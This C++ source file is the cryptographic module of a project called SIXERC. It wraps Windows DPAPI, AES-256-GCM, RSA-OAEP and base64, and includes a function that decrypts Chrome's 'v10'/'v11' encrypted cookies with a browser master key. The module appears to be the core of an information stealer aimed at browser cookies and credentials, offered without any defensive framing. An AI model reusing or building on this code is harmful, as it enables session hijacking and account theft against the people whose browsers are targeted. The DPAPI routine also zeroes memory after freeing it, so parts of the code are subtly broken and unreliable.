// ============================================================================
// SIXERC — Cryptographic Engine
// ============================================================================

#include "core/crypto.hpp"
#include <openssl/rand.h>
#include <openssl/err.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <cstring>

namespace sixerc::crypto {

bytes dpapi_decrypt(const bytes& encrypted) {
    if (encrypted.empty()) return {};
    
    DATA_BLOB in_blob{};
    DATA_BLOB out_blob{};
    in_blob.pbData = const_cast<BYTE*>(encrypted.data());
    in_blob.cbData = static_cast<DWORD>(encrypted.size());
    
    if (!CryptUnprotectData(&in_blob, nullptr, nullptr, nullptr, nullptr, 0, &out_blob)) {
        return {};
    }
    
    bytes result(out_blob.pbData, out_blob.pbData + out_blob.cbData);
    LocalFree(out_blob.pbData);
    secure_zero(out_blob.pbData, out_blob.cbData);
    return result;
}

bytes dpapi_encrypt(const bytes& plaintext) {
    if (plaintext.empty()) return {};
    
    DATA_BLOB in_blob{};
    DATA_BLOB out_blob{};
    in_blob.pbData = const_cast<BYTE*>(plaintext.data());
    in_blob.cbData = static_cast<DWORD>(plaintext.size());
    
    if (!CryptProtectData(&in_blob, L"SIXERC", nullptr, nullptr, nullptr, 
                          CRYPTPROTECT_UI_FORBIDDEN, &out_blob)) {
        return {};
    }
    
    bytes result(out_blob.pbData, out_blob.pbData + out_blob.cbData);
    LocalFree(out_blob.pbData);
    return result;
}

bytes aes_gcm_encrypt(const bytes& plaintext, const bytes& key, const bytes& iv, bytes& tag) {
    tag.resize(16);
    bytes ciphertext(plaintext.size());
    
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return {};
    
    int len;
    int ciphertext_len;
    
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, static_cast<int>(iv.size()), nullptr) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    if (EVP_EncryptInit_ex(ctx, nullptr, nullptr, key.data(), iv.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    if (EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(), static_cast<int>(plaintext.size())) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    ciphertext_len = len;
    
    if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    ciphertext_len += len;
    
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    EVP_CIPHER_CTX_free(ctx);
    ciphertext.resize(ciphertext_len);
    return ciphertext;
}

bytes aes_gcm_decrypt(const bytes& ciphertext, const bytes& key, const bytes& iv, const bytes& tag) {
    bytes plaintext(ciphertext.size());
    
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return {};
    
    int len;
    int plaintext_len;
    
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, static_cast<int>(iv.size()), nullptr) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    if (EVP_DecryptInit_ex(ctx, nullptr, nullptr, key.data(), iv.data()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    if (EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext.data(), static_cast<int>(ciphertext.size())) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    plaintext_len = len;
    
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, const_cast<byte*>(tag.data())) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    
    if (EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return {};
    }
    plaintext_len += len;
    
    EVP_CIPHER_CTX_free(ctx);
    plaintext.resize(plaintext_len);
    return plaintext;
}

bytes generate_random_bytes(size_t len) {
    bytes result(len);
    if (RAND_bytes(result.data(), static_cast<int>(len)) != 1) {
        return {};
    }
    return result;
}

bytes decrypt_chrome_cookie(const bytes& encrypted_value, const bytes& master_key) {
    if (encrypted_value.size() < 3 + 12 + 16) {
        return {};
    }
    
    // Check prefix: "v10" or "v11"
    if (encrypted_value[0] != 'v' || encrypted_value[1] != '1' || 
        (encrypted_value[2] != '0' && encrypted_value[2] != '1')) {
        return {};
    }
    
    const byte* nonce = encrypted_value.data() + 3;
    const byte* ciphertext = encrypted_value.data() + 3 + 12;
    size_t ciphertext_len = encrypted_value.size() - 3 - 12;
    
    if (ciphertext_len < 16) return {};
    
    size_t tag_offset = ciphertext_len - 16;
    bytes iv(nonce, nonce + 12);
    bytes cipher(ciphertext, ciphertext + tag_offset);
    bytes tag(ciphertext + tag_offset, ciphertext + ciphertext_len);
    
    return aes_gcm_decrypt(cipher, master_key, iv, tag);
}

bytes rsa_encrypt(const bytes& plaintext, const std::string& public_key_pem) {
    BIO* bio = BIO_new_mem_buf(public_key_pem.data(), static_cast<int>(public_key_pem.size()));
    if (!bio) return {};
    
    RSA* rsa = PEM_read_bio_RSA_PUBKEY(bio, nullptr, nullptr, nullptr);
    BIO_free(bio);
    if (!rsa) return {};
    
    bytes encrypted(RSA_size(rsa));
    int result = RSA_public_encrypt(
        static_cast<int>(plaintext.size()),
        plaintext.data(),
        encrypted.data(),
        rsa,
        RSA_PKCS1_OAEP_PADDING
    );
    
    RSA_free(rsa);
    
    if (result == -1) return {};
    encrypted.resize(result);
    return encrypted;
}

std::string rsa_generate_keypair() {
    BIGNUM* bne = BN_new();
    RSA* rsa = RSA_new();
    BN_set_word(bne, RSA_F4);
    RSA_generate_key_ex(rsa, 2048, bne, nullptr);
    
    BIO* bio = BIO_new(BIO_s_mem());
    PEM_write_bio_RSAPrivateKey(bio, rsa, nullptr, nullptr, 0, nullptr, nullptr);
    PEM_write_bio_RSA_PUBKEY(bio, rsa);
    
    BUF_MEM* mem;
    BIO_get_mem_ptr(bio, &mem);
    std::string result(mem->data, mem->length);
    
    BIO_free(bio);
    RSA_free(rsa);
    BN_free(bne);
    return result;
}

std::string base64_encode(const bytes& data) {
    BIO* bio = BIO_new(BIO_s_mem());
    BIO* b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    bio = BIO_push(b64, bio);
    
    BIO_write(bio, data.data(), static_cast<int>(data.size()));
    BIO_flush(bio);
    
    BUF_MEM* mem;
    BIO_get_mem_ptr(bio, &mem);
    std::string result(mem->data, mem->length);
    
    BIO_free_all(bio);
    return result;
}

bytes base64_decode(const std::string& encoded) {
    BIO* bio = BIO_new_mem_buf(encoded.data(), static_cast<int>(encoded.size()));
    BIO* b64 = BIO_new(BIO_f_base64());
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);
    bio = BIO_push(b64, bio);
    
    bytes result(encoded.size());
    int len = BIO_read(bio, result.data(), static_cast<int>(encoded.size()));
    
    BIO_free_all(bio);
    if (len <= 0) return {};
    result.resize(len);
    return result;
}

void secure_zero(void* ptr, size_t len) {
    if (ptr && len > 0) {
        SecureZeroMemory(ptr, len);
    }
}

} // namespace sixerc::crypto
